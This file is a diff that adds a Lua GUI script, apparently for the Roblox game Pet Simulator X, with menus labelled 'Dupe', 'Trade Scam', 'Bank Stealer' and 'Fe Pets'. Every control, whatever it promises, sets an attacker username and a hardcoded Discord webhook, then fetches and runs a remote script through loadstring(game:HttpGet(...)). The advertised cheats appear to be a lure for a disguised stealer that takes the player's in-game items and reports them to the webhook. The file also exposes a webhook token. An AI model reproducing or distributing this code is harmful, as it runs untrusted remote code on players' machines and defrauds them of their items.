@@ -1,0 +1,150 @@
+local Dupe = X.New({
+	Title = "Dupe"
+})
+
+local A = Dupe.Button({
+	Text = "Gloom's Dupe Method",
+	Callback = function()
+	UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end
+})
+
+
+local A = Dupe.Button({
+	Text = "Wah's Dupe Method",
+	Callback = function()
+	UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end
+})
+
+local Trade = X.New({
+	Title = "Trade Scam"
+})
+
+local A = Trade.Button({
+	Text = "Switch Pets",
+	Callback = function()
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end
+})
+
+local A = Trade.Button({
+	Text = "Crash Trade",
+	Callback = function()
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end
+})
+
+local A = Trade.Button({
+	Text = "Auto Accept",
+	Callback = function()
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end
+})
+
+local A = Trade.Button({
+	Text = "Fake Pets",
+	Callback = function()
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end
+})
+
+local Bank = X.New({
+	Title = "Bank Stealer"
+})
+
+local B = Bank.Toggle({
+	Text = "Auto Depo- Pets",
+	Callback = function(Value)
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end,
+	Enabled = false
+})
+
+local B = Bank.Toggle({
+	Text = "Auto Depo- Gems",
+	Callback = function(Value)
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end,
+	Enabled = false
+})
+
+local B = Bank.Toggle({
+	Text = "WebHook",
+	Callback = function(Value)
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end,
+	Enabled = false
+})
+
+local H = Bank.TextField({
+	Text = "WebHook (Optional)",
+	Callback = function(Value)
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end
+})
+
+local Fe = X.New({
+	Title = "Fe Pets"
+})
+
+local H = Fe.TextField({
+	Text = "Pet Name",
+	Callback = function(Value)
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end
+})
+
+local B = Fe.Toggle({
+	Text = "Work In Trades",
+	Callback = function(Value)
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end,
+	Enabled = false
+})
+
+local A = Fe.Button({
+	Text = "Get Pet",
+	Callback = function()
+		UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+	end
+})
